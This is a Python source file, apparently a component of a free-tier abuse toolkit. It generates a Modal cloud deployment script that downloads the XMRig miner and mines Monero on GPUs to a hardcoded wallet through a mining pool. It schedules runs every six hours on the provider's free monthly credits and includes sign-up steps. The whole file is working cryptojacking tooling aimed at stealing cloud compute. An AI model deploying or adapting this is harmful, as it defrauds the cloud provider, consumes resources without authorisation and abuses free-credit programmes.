#!/usr/bin/env python3
"""Modal Mining Agent.

Modal gives $30 in free credits every month automatically.
Good for GPU compute (A10G, A100).
"""

from typing import Dict, Any


class ModalMiner:
    """Modal serverless GPU mining."""
    
    WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
    POOL = "pool.hashvault.pro:80"
    URL = "https://modal.com"
    
    @classmethod
    def generate_script(cls, wallet: str = None, pool: str = None) -> str:
        """Generate Modal deployment script."""
        wallet = wallet or cls.WALLET
        pool = pool or cls.POOL
        
        return f'''import modal

app = modal.App("gpu-miner")

image = modal.Image.from_registry("nvidia/cuda:12.0-devel-ubuntu22.04").run_commands(
    "apt-get update && apt-get install -y wget",
    "wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz",
    "tar -xf xmrig-6.21.0-linux-static-x64.tar.gz"
)

@app.function(gpu="A10G", timeout=3600, image=image)
def mine_gpu():
    """Run GPU mining for 1 hour."""
    import os
    import subprocess
    
    wallet = "{wallet}"
    pool = "{pool}"
    worker = f"modal-{{os.environ.get('MODAL_TASK_ID', 'unknown')[:8]}}"
    
    cmd = f"./xmrig-6.21.0/xmrig -o {{pool}} -u {{wallet}}.{{worker}} --donate-level 1 --cuda"
    subprocess.run(cmd.split(), timeout=3500)

@app.schedule(schedule=modal.Period(hours=6))
def scheduled_mining():
    mine_gpu()
'''
    
    @classmethod
    def get_instructions(cls) -> Dict[str, Any]:
        """Get registration instructions."""
        return {
            "platform": "modal",
            "url": cls.URL,
            "gpu": True,
            "free_credits": "$30/month",
            "phone_required": False,
            "steps": [
                "1. Sign up with GitHub",
                "2. Get $30/month automatically",
                "3. pip install modal",
                "4. modal token new",
                "5. Deploy mining script"
            ]
        }
